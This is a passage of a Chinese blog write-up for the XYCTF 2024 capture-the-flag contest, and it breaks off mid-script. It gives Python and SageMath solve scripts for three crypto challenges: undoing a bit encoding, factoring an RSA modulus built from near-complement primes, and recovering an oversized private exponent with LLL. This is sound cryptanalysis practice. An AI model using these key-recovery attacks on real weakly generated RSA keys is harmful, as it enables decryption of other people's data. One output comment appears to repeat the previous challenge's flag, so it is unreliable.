

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="TMagWarO">
  <meta name="keywords" content="">
  
    <meta name="description" content="题目顺序按照解题顺序排列，只打了前面两周，后面没看了 Crypto第一题1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Util.number import *from tqdm import *import gmpy2flag&#x3D;b&amp;#x27;XYCTF&amp;#123;uuid&amp;#">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF2024WP">
<meta property="og:url" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/index.html">
<meta property="og:site_name" content="TMagWarO">
<meta property="og:description" content="题目顺序按照解题顺序排列，只打了前面两周，后面没看了 Crypto第一题1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Util.number import *from tqdm import *import gmpy2flag&#x3D;b&amp;#x27;XYCTF&amp;#123;uuid&amp;#">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240401222652666.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240401224835774.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240401225144467.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406233327363.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406233833698.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406204046688.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406205133185.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406204350324.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406204445831.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240406234134890.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407124249519.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240415202639649.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407203224965.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407203514580.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407220852148.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407213102631.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407212856962.png">
<meta property="og:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240407212928896.png">
<meta property="article:published_time" content="2024-04-29T12:50:35.000Z">
<meta property="article:modified_time" content="2024-04-29T03:46:20.605Z">
<meta property="article:author" content="TMagWarO">
<meta property="article:tag" content="Crypto Misc">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/image-20240401222652666.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>XYCTF2024WP - TMagWarO</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"tmagwaro.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"9zKUxWzO3llfnXbD1wQfmb7M-gzGzoHsz","app_key":"rZfSX0UXAOdFxxfd3x5lGb6l","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>TMagWarO</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="XYCTF2024WP"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-04-29 20:50" pubdate>
          2024年4月29日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          34 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">XYCTF2024WP</h1>
            
            
              <div class="markdown-body">
                
                <p>题目顺序按照解题顺序排列，只打了前面两周，后面没看了</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">from Crypto.Util.number import *<br>from tqdm import *<br>import gmpy2<br>flag=b&#x27;XYCTF&#123;uuid&#125;&#x27;<br>flag=bytes_to_long(flag)<br>leak=bin(int(flag))<br>while 1:<br>    leak += &quot;0&quot;<br>    if len(leak) == 514:<br>        break<br>#swap_bits函数将input_str的二进制位前后颠倒<br>def swap_bits(input_str):<br>    input_list = list(input_str[2:])<br>    length = len(input_list)<br><br>    for i in range(length // 2):<br>        temp = input_list[i]<br>        input_list[i] = input_list[length - 1 - i]<br>        input_list[length - 1 - i] = temp<br><br>    return &#x27;&#x27;.join(input_list)<br><br>input_str = leak<br>result = swap_bits(input_str)<br>a=result<br>#custom_add将input_str的二进制数的每一位（0或1）加上i+1后对10取余<br>def custom_add(input_str):<br>    input_list = list(input_str)<br>    length = len(input_list)<br>    for i in range(length):<br>        input_list[i] = str((int(input_list[i]) + i + 1) % 10)<br><br>    result = &#x27;&#x27;.join(input_list)<br>    return result<br><br><br>input_str = a<br>result = custom_add(input_str)<br>b=result<br>print(b)<br>#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567799112455779902334667900133556899112356678902344568890233457790013355689912335667990134456799023355788001244568991123467799012455778902335578800134456899123356678001344567991223557880012455689901235667801134457889023355788001345578890233566789013445778912235567900124557889013356678001344578801233467789112355779912234577990233556780113<br></code></pre></td></tr></table></figure>

<p>故只需将原代码中custom_add的加操作改为减再颠倒就是flag的二进制。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b = &#x27;<span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">90123456789012</span><span class="hljs-number">34567890123456</span><span class="hljs-number">78901234567890</span><span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">90123456789012</span><span class="hljs-number">34567890123456</span><span class="hljs-number">78901234567890</span><span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">91134567799112</span><span class="hljs-number">45577990233466</span><span class="hljs-number">79001335568991</span><span class="hljs-number">12356678902344</span><span class="hljs-number">56889023345779</span><span class="hljs-number">00133556899123</span><span class="hljs-number">35667990134456</span><span class="hljs-number">79902335578800</span><span class="hljs-number">12445689911234</span><span class="hljs-number">67799012455778</span><span class="hljs-number">90233557880013</span><span class="hljs-number">44568991233566</span><span class="hljs-number">78001344567991</span><span class="hljs-number">22355788001245</span><span class="hljs-number">56899012356678</span><span class="hljs-number">01134457889023</span><span class="hljs-number">35578800134557</span><span class="hljs-number">88902335667890</span><span class="hljs-number">13445778912235</span><span class="hljs-number">56790012455788</span><span class="hljs-number">90133566780013</span><span class="hljs-number">44578801233467</span><span class="hljs-number">78911235577991</span><span class="hljs-number">22345779902335</span><span class="hljs-number">56780113</span>&#x27;<br><br>def custom_sub(input_str):<br>    input_list = list(input_str)<br>    length = len(input_list)<br><br>    for i in range(length):<br>        input_list[i] = str((int(input_list[i]) - i - <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>)<br><br>    result = &#x27;&#x27;.join(input_list)<br>    return result<br><br><br>print(long_to_bytes(int(custom_sub(b)[::-<span class="hljs-number">1</span>].strip(&#x27;0&#x27;), <span class="hljs-number">2</span>)))<br><span class="hljs-meta">#b&#x27;XYCTF&#123;24611067-c60f-427c-aaab-d17e4b81e2ee&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="第二题：happy-to-solve"><a href="#第二题：happy-to-solve" class="headerlink" title="第二题：happy_to_solve"></a>第二题：happy_to_solve</h3><p>题目</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_happy_prime</span>():<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = sympy.nextprime(p ^ ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">512</span>) - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> p, q<br><br><br>m = bytes_to_long(flag)<br>p, q = get_happy_prime()<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-comment"># 24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-comment"># 14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><br></code></pre></td></tr></table></figure>

<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span> = <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><br><span class="hljs-attribute">r</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-attribute">x</span> = <span class="hljs-number">2</span>**<span class="hljs-number">512</span> -<span class="hljs-number">1</span> + r<br>    <span class="hljs-attribute">tmp</span> = x ** <span class="hljs-number">2</span> - <span class="hljs-number">4</span>*n<br>    <span class="hljs-attribute">y</span> = gmpy2.iroot(tmp,<span class="hljs-number">2</span>)<br>    <span class="hljs-attribute">if</span> y[<span class="hljs-number">1</span>]:<br>        <span class="hljs-attribute">p</span> = (x+y[<span class="hljs-number">0</span>]) // <span class="hljs-number">2</span><br>        <span class="hljs-attribute">q</span> = n // p<br>        <span class="hljs-attribute">d</span> = gmpy2.invert(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>        <span class="hljs-attribute">m</span> = pow(c,d,n)<br>        <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>        <span class="hljs-attribute">print</span>(r)             <br>        <span class="hljs-attribute">break</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">r</span> += <span class="hljs-number">1</span><br><span class="hljs-comment">#b&#x27;XYCTF&#123;24611067-c60f-427c-aaab-d17e4b81e2ee&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="第三题：factor1"><a href="#第三题：factor1" class="headerlink" title="第三题：factor1"></a>第三题：factor1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">import</span> hashlib<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><span class="hljs-attribute">p</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">q</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">d</span> = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-attribute">e</span> = gmpy2.invert(d, (p**<span class="hljs-number">3</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">3</span> - <span class="hljs-number">1</span>))<br><span class="hljs-attribute">flag</span> = <span class="hljs-string">&quot;XYCTF&#123;&quot;</span> + hashlib.md5(str(p + q).encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-attribute">print</span>(e)<br><span class="hljs-attribute">print</span>(p * q)<br><span class="hljs-comment"># 172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span><br><span class="hljs-comment"># 99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><br><br></code></pre></td></tr></table></figure>

<p>e过大，想到低解密指数攻击，同时得到两个函数，<br>$$<br>e * d &#x3D; 1 mod(p^{3}-1)*(q^{3}-1)<br>$$</p>
<p>$$<br>n &#x3D; p * q<br>$$</p>
<p>令n&#x3D;$n^{3}$  在格上构造<br>$$<br>[D, n+1<br>$$</p>
<p>$$<br>0, -e]<br>$$</p>
<p>其中D &#x3D; 2^(n.nbits()&#x2F;&#x2F;2)</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#sagemath</span><br>e=172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163<br>n=99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793<br>n=n^3<br>from Crypto.Util.number import *<br>import random<br>from gmpy2 import *<br>D = 2^(n.nbits()//2)<br>m = matrix(ZZ, [<br>  [D, n+1],<br>  [0, -e]<br>])<br>L = m.LLL()<br>w = L[0]<br>v = m.solve_left(w)<br>k = abs(v[0])<br>d = abs(v[1])<br>print(k)<br>print(d)<br>k=1494016303704162064457264904035459059241052443477469129020991127731711502975536480528822831565100775167693515363479900721259984367515846296462994230670260<br>d=8447122254265361577759220083550460887840558233627984117576685838469227480934556534673167325385487344741530262745308367064419215281251764917289925433582347<br><br></code></pre></td></tr></table></figure>

<p>根据k,d即可求出p,q</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><br>e=<span class="hljs-number">172005065945326769176157335849432320425605083524943730546805772515111751580759726759492349719668775270727323745284785341119685198468883978645793770975366048506237371435027612758232099414404389043740306443065413069994232238075194102578269859784981454218948784071599231415554297361219709787507633404217550013282713899284609273532223781487419770338416653260109238572639243087280632577902857385265070736208291583497988891353312351322545840742380550393294960815728021248513046077985900158814037534487146730483099151396746751774427787635287611736111679074330407715700153025952858666841328055071403960165321273972935204988906850585454805923440635864200149694398767776539993952528995717480620593326867245714074205285828967234591508039849777840636255379730281105670496110061909219669860172557450779495125345533232776767292561378244884362014224844319802810586344516400297830227894063759083198761120293919537342405893653545157892446163</span><br>n=<span class="hljs-number">99075185389443078008327214328328747792385153883836599753096971412377366865826254033534293886034828804219037466246175526347014045811852531994537520303063113985486063022444972761276531422538694915030159420989401280012025249129111871649831185047820236417385693285461420040134313833571949090757635806658958193793</span><br>k=<span class="hljs-number">1494016303704162064457264904035459059241052443477469129020991127731711502975536480528822831565100775167693515363479900721259984367515846296462994230670260</span><br>d=<span class="hljs-number">8447122254265361577759220083550460887840558233627984117576685838469227480934556534673167325385487344741530262745308367064419215281251764917289925433582347</span><br><br>k = e * d - <span class="hljs-number">1</span><br><br>r = k<br>t = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = r // <span class="hljs-number">2</span><br>    t += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> r % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>success = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):<br>    g = random.randint(<span class="hljs-number">0</span>, n)<br>    y = <span class="hljs-built_in">pow</span>(g, r, n)<br>    <span class="hljs-keyword">if</span> y == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> y == n - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t):<br>        x = <span class="hljs-built_in">pow</span>(y, <span class="hljs-number">2</span>, n)<br>        <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span>:<br>            success = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> x == n - <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            y = x<br><br>    <span class="hljs-keyword">if</span> success:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-keyword">if</span> success:<br>    p = libnum.gcd(y - <span class="hljs-number">1</span>, n)<br>    q = n // p<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span> + <span class="hljs-string">&#x27;%s&#x27;</span> % p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q = &#x27;</span> + <span class="hljs-string">&#x27;%s&#x27;</span> % q)<br>    flag = <span class="hljs-string">&quot;XYCTF&#123;&quot;</span> + hashlib.md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-built_in">print</span>(n==p*q)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Cannot compute P and Q&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;   </span><br><span class="hljs-string">p = 9212046353930376594996890089494718736894378991991381248242532319628627449681664076081705664941905594411935750003102856235503684466394327681725704255564467</span><br><span class="hljs-string">q = 10754959493573546439510276829300246769373124436128170955050379041986504869221750743052397622171703140881050431144683659643071578143360949942206693325622779</span><br><span 